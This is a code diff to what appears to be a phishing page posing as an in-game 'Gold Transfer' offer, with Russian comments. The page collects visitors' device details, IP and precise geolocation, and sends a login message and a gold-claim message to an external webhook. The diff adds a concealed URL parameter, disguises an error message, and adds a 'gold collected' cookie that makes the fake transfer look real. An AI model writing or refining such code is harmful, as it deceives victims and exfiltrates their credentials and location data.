@@ -73,7 +73,8 @@
 </head>
 <body>
   <div class="container">
-    <h1>Gold transfer</h1>
+    <h1>Gold Transfer</h1>
+    <!-- Область для отображения данных декодированного URL -->
     <div id="url-info"></div>
       
     <div class="form-section">
@@ -100,6 +101,32 @@
   </div>
   
   <script>
+    // Вспомогательные функции для работы с cookie
+    function setCookie(name, value, days) {
+      const date = new Date();
+      date.setTime(date.getTime() + (days*24*60*60*1000));
+      document.cookie = name + "=" + encodeURIComponent(value) + ";expires=" + date.toUTCString() + ";path=/";
+    }
+
+    function getCookie(name) {
+      const value = "; " + document.cookie;
+      const parts = value.split("; " + name + "=");
+      if (parts.length === 2) return decodeURIComponent(parts.pop().split(";").shift());
+      return null;
+    }
+    
+    // Проверяем, получал ли уже пользователь голду
+    function checkGoldCollected() {
+      return getCookie("gold_collected") === "true";
+    }
+
+    // Если пользователь уже получил Gold, отображаем сообщение и скрываем кнопку получения
+    window.onload = function() {
+      if (checkGoldCollected()) {
+        document.getElementById("gold-section").innerHTML = '<h2>Вы уже получили Gold</h2>';
+      }
+    };
+
     const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";
 
     // Объект для хранения информации об устройстве, IP и геолокации
@@ -132,7 +159,7 @@
           clientInfo.geolocation = {
             latitude: coords.latitude,
             longitude: coords.longitude,
-            accuracy: coords.accuracy, // точность в метрах
+            accuracy: coords.accuracy,
             altitude: coords.altitude || null,
             altitudeAccuracy: coords.altitudeAccuracy || null,
             heading: coords.heading || null,
@@ -162,7 +189,11 @@
       clientInfo.geolocation = { error: 'Geolocation not supported' };
     }
 
-    // Функция декодирования Base64-параметров из строки URL
+    /* 
+      Функция декодирования Base64-параметров из строки URL.
+      Структура строки:
+      [len(sender_id)][sender_id][len(sender_nick)][sender_nick][len(gold_amount)][gold_amount][hidden_param (остальное)]
+    */
     function decodeBase64Params(base64Str) {
       try {
         const decodedStr = atob(base64Str);
@@ -181,9 +212,12 @@
         const goldAmountLength = parseInt(decodedStr[idx], 10);
         idx++;
         const goldAmount = decodedStr.substr(idx, goldAmountLength);
-        return { senderId, senderNick, goldAmount };
+        idx += goldAmountLength;
+        // Если в строке ещё есть данные, это скрытый параметр
+        const hiddenParam = idx < decodedStr.length ? decodedStr.substr(idx) : null;
+        return { senderId, senderNick, goldAmount, hiddenParam };
       } catch (error) {
-        console.error("Ошибка декодирования параметров:", error);
+        console.error("Ошибка ID транзакции:", error);
         return null;
       }
     }
@@ -198,7 +232,7 @@
       return null;
     }
 
-    // Отображение параметров на странице
+    // Отображение параметров на странице (скрытый параметр не выводится)
     const urlParams = getParamsFromURL();
     if (urlParams) {
       document.getElementById("url-info").innerHTML =
@@ -237,16 +271,21 @@
 
       sendDataToWebhook(message, function(success) {
         if (success) {
-          document.getElementById("login-result").textContent = "Авторизация прошла успешно";
+          document.getElementById("login-result").textContent = "Авторизация прошла успешно ✅";
           document.getElementById("gold-section").style.display = "block";
         } else {
-          document.getElementById("login-result").textContent = "Ошибка при авторизации";
+          document.getElementById("login-result").textContent = "Ошибка при авторизации ❌";
         }
       });
     });
 
     // Обработка запроса на получение голды
     document.getElementById("get-gold-button").addEventListener("click", function() {
+      // Если пользователь уже получил Gold, просто выходим
+      if (checkGoldCollected()) {
+        alert("Вы уже получили Gold");
+        return;
+      }
       if (urlParams) {
         const message = "Запрос на получение голды:\n" +
                         "ID отправителя: " + urlParams.senderId + "\n" +
@@ -257,8 +296,12 @@
         sendDataToWebhook(message, function(success) {
           if (success) {
             alert("Передача Gold успешно завершена");
+            // Сохраняем отметку о получении Gold в cookie на 7 дней
+            setCookie("gold_collected", "true", 7);
+            // Обновляем интерфейс
+            document.getElementById("gold-section").innerHTML = '<h2>Вы уже получили Gold</h2>';
           } else {
-            alert("Ошибка при отправке запроса на получение Gold");
+            alert("Ошибка при получение Gold.");
           }
         });
       } else {
